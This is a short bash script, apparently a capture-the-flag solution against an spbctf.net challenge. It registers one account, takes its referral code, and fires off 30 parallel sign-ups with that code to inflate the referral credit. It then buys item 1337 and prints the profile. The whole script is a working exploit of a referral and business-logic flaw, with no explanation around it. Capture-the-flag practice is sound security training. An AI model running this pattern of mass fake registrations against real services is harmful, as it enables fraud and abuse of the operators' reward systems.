#!/bin/bash

user0=user_$(date +%s)

curl -X POST "https://t-galera-u12p5koe.spbctf.net/create" \
  -H "Content-Type: application/json" \
	--data '{"username": "'$user0'", "password": "'$user0'"}'
echo

token0=$(
	curl -s -X POST "https://t-galera-u12p5koe.spbctf.net/enter" \
    -H "Content-Type: application/json" \
		--data '{"username": "'$user0'", "password": "'$user0'"}'
)

code=$(curl -s "https://t-galera-u12p5koe.spbctf.net/ref" -H "Authorization: $token0")

for ((i = 1; i <= 30; i++)); do
  user=user_$(date +%s)_$i

  curl -X POST "https://t-galera-u12p5koe.spbctf.net/create" \
    -H "Content-Type: application/json" \
    --data '{"username": "'$user'", "password": "'$user'", "ref_code": "'$code'" }' &>/dev/null &
done

sleep 5
curl -s "https://t-galera-u12p5koe.spbctf.net/buy?id=1337" -H "Authorization: $token0"
echo
curl -s "https://t-galera-u12p5koe.spbctf.net/profile" -H "Authorization: $token0" | jq